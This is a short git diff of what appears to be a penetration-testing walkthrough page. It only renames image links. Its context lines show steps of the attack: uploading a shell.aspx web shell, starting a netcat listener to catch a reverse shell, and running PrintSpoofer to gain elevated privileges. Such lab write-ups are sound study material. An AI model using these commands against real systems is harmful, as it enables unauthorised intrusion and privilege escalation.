@@ -112,7 +112,7 @@ put shell.aspx
 <pre><code><strong>rlwrap nc -lvnp 1337
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (11) (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -152,6 +152,6 @@ PrintSpoofer.exe -i -c whoami
 PrintSpoofer.exe -i -c powershell.exe
 ```
 
-<figure><img src="../../.gitbook/assets/image (13) (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13) (3).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (22) (3) (1).png" alt=""><figcaption></figcaption></figure>
